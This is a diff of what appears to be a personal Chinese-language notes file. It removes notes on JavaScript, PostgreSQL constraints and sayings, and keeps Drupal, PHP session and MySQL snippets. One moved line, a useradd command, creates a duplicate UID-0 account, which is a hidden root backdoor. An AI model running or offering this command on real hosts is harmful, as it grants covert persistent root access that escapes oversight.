@@ -5,51 +5,6 @@
 
 postgreSQL参考：http://www.postgresql.org/docs/9.5/interactive/index.html
 
-http://www.jb51.net/books/387538.html
-
-campaign/lby/share/EA11,mysql,new
-
-//javascript 的sort用法
-var v = [0,1,5,10,15];
-v.sort(function(v1,v2){
-	return v1 > v2 ? -1 : (v1 == v2 ? 0 : 1);
-});
-console.log(v);
-数组的操作方法：
-concat
-var colors = ['red','green','blue'];
-var colors2 = colors.concat('yellow',['black','brown']);   ===> red,green,blue,yellow,black,brown
-
-document.forms  //html文档中全forms节点
-document.images  //html文档中全img节点
-document.getElementById('').getElementByTagName('img')   //获得文档中某个区域的img节点集合
-
-
-slice 方法
-splice方法
-
-indexOf()和 lastIndexOf()是ECMAScript 5为数组添加的两个方法
-every(),filter(),forEach(),map(),some()是ECMAScript 5为数组添加的迭代方法
-reduce(），reduceRight()是ECMAScript 5为数组添加的缩小方法
-
-用a模拟打开新窗口的方法：
-
-<input type="button" id="submit" value="点我有惊喜" />
-<a id="viewer" href="" style="display:none;" target="_blank"><span id="simulate"></span></a>
-	
-<script>
-	$('#submit').click(function(){
-		document.getElementById('viewer').href='http://www.baidu.com/';
-		document.getElementById('simulate').click();
-	});
-</script>
-
-为了生成0和任意上限这间的随机整数，可使用下列公式：
-Math.floor(Math.random() * (n + 1)) 其中n是上限，Math.floor返回浮点数的整数部分.
-
-为了生成1和任意之间的随机数，可以使用下列公式：
-Math.floor(Math.random() * n ) + 1  其中n是上限
-
 
 
 
@@ -67,36 +22,13 @@ require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
 drupal_bootstrap(DRUPAL_BOOTSTRAP_DATABASE);
 db_set_active('activity');
 
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash vxzhan
+select (@i:=@i+1) as i,post_time from tb_check_price,(select @i:=0) as tt  order by post_time desc; 
 
 
 ************************************************************************************************************
 
 
-Love makes all hard hearts gentle.  爱情把一切冷酷的心变得温柔。
-
-
-七情指一般人所具有之七种感情：喜、怒、哀、惧、爱、恶、恨。
-六欲指眼、耳、鼻、舌、身、意六欲。 
-七情，指一般人所具有之七种感情：喜、怒、哀、惧、爱、恶、恨。
-六欲，据大智度论卷二记载，系指凡夫对异性所具有之六种欲望：
-色欲、形貌欲、威仪欲、言语音声欲、细滑欲、人相欲；或指眼、耳、鼻、舌、身、意等六欲。
-今所用‘七情六欲’一语，即套用佛典中之‘六欲’，泛指人之情绪、欲望等。
-七情六欲是人类基本的生理要求和心理动态，是人性基础的基础。
-现代汉语概念里，情与欲还不完全是一回事。
-情主要是指人的情感表现，属于人的心理活动范畴；
-而欲主要是指人的生存和享受的需要，属于生理活动的范畴。
-
-谦卑不是看轻自己，而是不仅为自己着想。
-
-面向对象的编程到底应当牢记什么？ 保持对象小型化、模块化、非耦合以及流线型.
-
-标准方差：方差的平方根，一组数据中的每一个数与这组数据的平均数的差的平方的和再除以数据的个数，再取平方根。
-σ={[∑(Xi-X)^2]/n}^(1/2)
-σ标准方差    Xi样本数据，i取1到n    X样本的平均数     n样本个数
-标准方差能反映一个数据集的离散程度，数据整体分布离平均值越近，标准方差就越小。
-
-useradd -o -u 0 -g 0 -M -d /root -s /bin/bash vxzhan
-select (@i:=@i+1) as i,post_time from tb_check_price,(select @i:=0) as tt  order by post_time desc; 
 
 session.name = PHPSESSID			//默认session名为PHPSESSID
 session.use_trans_sid = 0			//默认为0 对每个URL启用session名=SID,不建议开启，存在安全问题
@@ -114,149 +46,6 @@ session.use_cookies = 1				//sessionid在客户端采用的存储方式，置1�
 
 
 
-POSTGRESQL位置参数：
-
-CREATE FUNCTION dept(text) RETRURNS dept 
-	AS $$ SELECT * FROM dept WHERE name = $1 $$
-	LANGUAGE SQL;
-在函数被调用的时候这里的$1将引用第一个参数
-
-POSTGRESQL下标：如果一个表达式生成一个数组类型的数值，那么我们可以通过下面这样的表达式来提取数组中的元素 
-	expression[subscript]
-	expression[lower_subscript:upper_subscript] 多个相邻的元素（‘数组片断’）
-	mytable.arraycolumn[4]
-	mytable.two_d_column[17][34]
-	$1[10:42]
-	(arrayfunction(a,b))[42]
-
-
-POSTGRESQL排序规则表达式，标量子查询，数组构造器，行构造器，。
-
-POSTGRESQL第四章
-常用的数据类型有：用于整数的integer、用于可能为分数的numeric、用于字符串的text、用于日期的date、用于时间的time、用于时间戳的timestamp。
-
-创建表
-CREATE TABLE products (
-    product_no integer,
-    name text,
-    price numeric
-);
-提示: 如果你创建了许多相互关联的表，那么最好为表和字段选择一致的命名模式。比如，表名字可以统一选择单数或者复数，两种选择都有这样那样的理论家支持。
-DROP TABLE products;  删除一个表,可以使用DROP TABLE IF EXISTS来避免错误消息，不过这并不符合 SQL 标准
-创建缺省值的示例
-CREATE TABLE products (
-    product_no integer,
-    name text,
-    price numeric DEFAULT 9.99
-);
-CREATE TABLE products (
-    product_no integer DEFAULT nextval('products_product_no_seq'),
-);
-CREATE TABLE products (
-    product_no SERIAL,
-);
-检查约束
-CREATE TABLE products (
-    product_no integer,
-    name text,
-    price numeric CHECK (price > 0)
-);
-或者给约束定一个名字
-CREATE TABLE products (
-    product_no integer,
-    name text,
-    price numeric CONSTRAINT positive_price CHECK (price > 0)
-);
-多个检查约束的示例
-CREATE TABLE products (
-    product_no integer,
-    name text,
-    price numeric CHECK (price > 0),  --字段约束
-    discounted_price numeric CHECK (discounted_price > 0), --字段约束
-    CHECK (price > discounted_price) 或者命名 CONSTRAINT valid_discount CHECK (price > discounted_price)    --表约束
-);
-非空约束
-CREATE TABLE products (
-    product_no integer NOT NULL,
-    name text NOT NULL,
-    price numeric
-);
-一个非空约束总是写成一个字段约束。非空约束在功能上等效于创建一个检查约束 CHECK (column_name IS NOT NULL)，但在PostgreSQL里，创建一个明确的非空约束效率更高。缺点是你不能给它一个明确的名字。
-提示: 在大多数数据库设计里，主要的字段都应该标记为非空。
-
-唯一约束
-CREATE TABLE products (
-    product_no integer UNIQUE,
-    name text,
-    price numeric
-);
-或者
-CREATE TABLE products (
-    product_no integer,
-    name text,
-    price numeric,
-    UNIQUE (product_no)
-);
-或者多个字段组成唯一约束
-CREATE TABLE example (
-    a integer,
-    b integer,
-    c integer,
-    UNIQUE (a, c)
-);
-可以给唯一约束赋予一个自己定义的名字：（添加一个唯一约束通常会自动在约束中使用的列或一组列上创建一个唯一btree索引。）
-CREATE TABLE products (
-    product_no integer CONSTRAINT must_be_different UNIQUE,
-    name text,
-    price numeric
-);
-通常，如果包含在唯一约束中的那几个字段在表中有多个相同的行，就违反了唯一约束。但是在这种比较中，NULL 被认为是不相等的。这就意味着，在多字段唯一约束的情况下，如果在至少一个字段上出现 NULL ，那么我们还是可以存储同样的这种数据行。这种行为遵循 SQL 标准，但是我们听说其它 SQL 数据库可能不遵循这个标准。因此如果你要开发可移植的程序，那么最好仔细些。
-
-主键约束
-从技术上讲，主键约束只是唯一约束和非空约束的组合。所以，下面两个表定义是等价的： 
-CREATE TABLE products (
-    product_no integer UNIQUE NOT NULL,
-    name text,
-    price numeric
-);
-等价于
-CREATE TABLE products (
-    product_no integer PRIMARY KEY,
-    name text,
-    price numeric
-);
-创建多个字段的主键约束示例：
-CREATE TABLE example (
-    a integer,
-    b integer,
-    c integer,
-    PRIMARY KEY (a, c)
-);
-主键表示一个或多个字段的组合可以用于唯一标识表中的数据行。这是定义一个主键的直接结果。请注意：一个唯一约束实际上并不能提供一个唯一标识，因为它不排除 NULL 。这个功能对文档目的和客户应用都很有用。比如，一个可以修改行数值的 GUI 应用可能需要知道一个表的主键才能唯一地标识每一行。
-添加一个主键将会在主键使用的列或一组列中自动创建一个唯一btree索引。
-一个表最多可以有一个主键(但是它可以有多个唯一和非空约束)。关系型数据库理论告诉我们，每个表都必须有一个主键。PostgreSQL并不强制这个规则，但我们最好还是遵循它。
-
-外键约束
-外键约束声明一个字段(或者一组字段)的数值必须匹配另外一个表中出现的数值。我们把这个行为称为两个相关表之间的参照完整性。
-CREATE TABLE products (
-    product_no integer PRIMARY KEY,
-    name text,
-    price numeric
-);
-CREATE TABLE orders (
-    order_id integer PRIMARY KEY,
-    product_no integer REFERENCES products (product_no),
-    quantity integer
-);
-也可以写成：
-CREATE TABLE orders (
-    order_id integer PRIMARY KEY,
-    product_no integer REFERENCES products,
-    quantity integer
-); 因为如果缺少字段列表的话，就会引用被引用表的主键。
-
-
-//窗口函数
 
 
 
